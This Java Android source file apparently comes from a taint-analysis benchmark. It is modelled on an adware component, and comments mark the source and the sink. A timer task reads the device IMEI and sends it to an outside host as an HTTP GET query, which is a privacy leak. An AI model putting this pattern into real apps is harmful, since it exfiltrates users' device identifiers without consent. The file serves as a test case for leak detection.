package com.safesys.remover;

import android.app.Activity;
import android.content.Context;
import android.net.ConnectivityManager;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Class: JmAdV2
 * Description:
 * Authors：Hao Fu(haofu@ucdavis.edu)
 * Date: 7/1/2016
 */
public class JmAdV2 {
    public static final int LEFT_BOTTOM = 1;
    public static final int LEFT_TOP = 0;
    public static final int RIGHT_BOTTOM = 3;
    public static final int RIGHT_TOP = 2;
    private boolean mIsInit;
    private long mLastTime;
    private Timer mTimer;
    private TimerTask mTimerTask;
    private Activity mActivity;
    private long mStartTime;
    private int mInterval;


    public JmAdV2(Activity activiy) {
        this.mIsInit = false;
        this.mTimer = null;
        this.mLastTime = 0;
        this.mStartTime = SystemClock.uptimeMillis();
        this.mActivity = activiy;
        this.mInterval = 99999; //40;
    }

    class C00532 extends TimerTask {
        C00532() {
        }

        public void run() {
            if (JmAdV2.this.mIsInit) {
                if (JmAdV2.this.mLastTime == 0) {
                    JmAdV2.this.mLastTime = System.currentTimeMillis();
                }
                return;
            }
            JmAdV2.this.initAdViews();
        }
    }

    private void initAdViews() {
        if (!this.mIsInit && isConnected()) {
            String[] adParams = "JU6:1:c62b31cb3a7041d5:88857ec052e653eb;ADWO:0:ce8a177663264f518fe8727d375d05a7".split(";");
            for (int i = LEFT_TOP; i < adParams.length; i += LEFT_BOTTOM) {
                initSingleAd(adParams[i].split(":"));
            }
            this.mIsInit = true;
        }
    }

    private boolean isConnected() {
        ConnectivityManager cmd = (ConnectivityManager) this.mActivity.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cmd.getNetworkInfo(LEFT_BOTTOM).isConnected()) {
            return true;
        }

        if (cmd.getNetworkInfo(LEFT_TOP).isConnected()) {
            return true;
        }
        return false;
    }

    private void initSingleAd(String[] params) {
        this.mActivity.runOnUiThread(new C00543(params[LEFT_TOP], params, Integer.parseInt(params[LEFT_BOTTOM])));
    }

    class C00543 implements Runnable {
        private final String val$name;
        private final int val$order;
        private final String[] val$params;

        C00543(String str, String[] strArr, int i) {
            this.val$name = str;
            this.val$params = strArr;
            this.val$order = i;
        }

        public void run() {
            if (this.val$name.equalsIgnoreCase("JU6")) {
                try {
                    TelephonyManager telephonyManager = (TelephonyManager) mActivity.getSystemService(Context.TELEPHONY_SERVICE);
                    String imei = telephonyManager.getDeviceId(); //source
                    Thread connectionThread = new Thread(new ConnectionThread(imei));
                    connectionThread.start();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void startAd() {
        if (this.mTimer == null) {
            this.mTimer = new Timer();
            this.mTimerTask = new C00532();
            this.mTimer.schedule(this.mTimerTask, 1000000, (long) (this.mInterval >= 70 ? this.mInterval * 500 : 38000));
        }
    }

  private class ConnectionThread implements Runnable {
        String data = "";

        public ConnectionThread(String data) {
            this.data = data;
        }

        @Override
        public void run() {
            try {
                connect(data);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        private void connect(String data) throws IOException {
            String URL = "http://www.google.com/search?q=";
            URL = URL.concat(data);
            java.net.URL url = new URL(URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
            conn.setRequestMethod("GET");
            conn.setDoInput(true);
            // Starts the query
            conn.connect();
            Log.d(getClass().getSimpleName(), URL);

            InputStream is = conn.getInputStream();
            if (is == null) {
                return;
            }
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            String line;
            try {
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                }
            } finally {
                br.close();
                is.close();
            }
            Log.d(getClass().getSimpleName(), sb.toString());
        }
    }

}
